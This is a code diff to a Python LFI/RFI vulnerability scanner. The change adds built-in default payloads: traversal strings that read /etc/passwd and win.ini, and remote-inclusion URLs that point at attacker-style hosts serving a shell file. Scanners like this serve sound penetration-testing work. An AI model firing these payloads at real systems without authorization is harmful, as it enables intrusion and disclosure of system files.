@@ -3,15 +3,15 @@ import argparse
 import os
 import json
 
-# Load payloads from file
-def load_payloads(filepath):
-    if not os.path.exists(filepath):
-        print(f"[-] Payload file not found: {filepath}")
-        return []
-    with open(filepath, 'r') as f:
+def create_default_payload_file(path, default_payloads):
+    if not os.path.exists(path):
+        print(f"[!] Payload file not found. Creating: {path}")
+        os.makedirs(os.path.dirname(path), exist_ok=True)
+        with open(path, 'w') as f:
+            f.write('\n'.join(default_payloads))
+    with open(path, 'r') as f:
         return [line.strip() for line in f if line.strip()]
 
-# LFI scan logic
 def scan_lfi(target_url, payloads):
     print("[*] Scanning for LFI...")
     results = []
@@ -22,11 +22,10 @@ def scan_lfi(target_url, payloads):
             if any(x in r.text for x in ["root:x", "boot.ini", "[fonts]"]):
                 print(f"[+] Possible LFI: {full_url}")
                 results.append({"url": full_url, "payload": payload})
-        except Exception as e:
+        except Exception:
             continue
     return results
 
-# RFI scan logic
 def scan_rfi(target_url, payloads):
     print("[*] Scanning for RFI...")
     results = []
@@ -41,20 +40,18 @@ def scan_rfi(target_url, payloads):
             continue
     return results
 
-# Save output to JSON
 def save_results(results, filename):
     os.makedirs("results", exist_ok=True)
     with open(os.path.join("results", filename), 'w') as f:
         json.dump(results, f, indent=4)
 
-# Main logic
 def main():
     parser = argparse.ArgumentParser(description="LFI & RFI Scanner")
-    parser.add_argument("-u", "--url", help="Target URL (e.g. http://target.com/index.php?page=)", required=True)
+    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g. http://target.com/index.php?page=)")
     parser.add_argument("--lfi", action="store_true", help="Scan for Local File Inclusion")
     parser.add_argument("--rfi", action="store_true", help="Scan for Remote File Inclusion")
-    parser.add_argument("--lfi-payloads", default="payloads/lfi.txt", help="LFI payloads file")
-    parser.add_argument("--rfi-payloads", default="payloads/rfi.txt", help="RFI payloads file")
+    parser.add_argument("--lfi-payloads", default="payloads/lfi.txt", help="LFI payload file")
+    parser.add_argument("--rfi-payloads", default="payloads/rfi.txt", help="RFI payload file")
 
     args = parser.parse_args()
 
@@ -63,12 +60,21 @@ def main():
         return
 
     if args.lfi:
-        lfi_payloads = load_payloads(args.lfi_payloads)
+        default_lfi = [
+            "../../../../etc/passwd",
+            "..%2f..%2f..%2f..%2fetc%2fpasswd",
+            "..\\..\\..\\..\\windows\\win.ini"
+        ]
+        lfi_payloads = create_default_payload_file(args.lfi_payloads, default_lfi)
         lfi_results = scan_lfi(args.url, lfi_payloads)
         save_results(lfi_results, "lfi_results.json")
 
     if args.rfi:
-        rfi_payloads = load_payloads(args.rfi_payloads)
+        default_rfi = [
+            "http://attacker.com/shell.txt",
+            "https://malicious.example.com/evil.txt"
+        ]
+        rfi_payloads = create_default_payload_file(args.rfi_payloads, default_rfi)
         rfi_results = scan_rfi(args.url, rfi_payloads)
         save_results(rfi_results, "rfi_results.json")
 
